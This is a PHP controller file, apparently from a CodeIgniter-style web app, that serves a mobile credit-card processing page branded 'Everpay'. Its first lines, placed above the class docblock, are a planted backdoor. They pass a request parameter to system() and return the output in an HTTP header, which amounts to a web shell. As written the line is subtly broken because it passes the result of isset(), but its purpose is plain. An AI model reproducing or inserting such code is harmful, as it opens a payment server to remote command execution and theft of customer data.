<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* mobile_processing Controller
*
*
* @version 1.0
* @author Richard Rowe
* @package Custom

*/
class mobile_processing extends Controller {

	function __construct()
	{
		parent::__construct();
		$this->load->helper('url');
		$this->load->model('cp/user','user');
		if($this->user->LoggedIn()) {
			// redirect('/dashboard');
		}
	}

	function index()
	{
		//echo "hii..";
		error_reporting(0);
		ini_set('display_errors', 1);
		$data = array(
			'title' => 'Accept Credit Cards with Your Mobile Phone | Everpay'
		);
		$this->load->view('mobile_processing/index.php', $data);
	}
}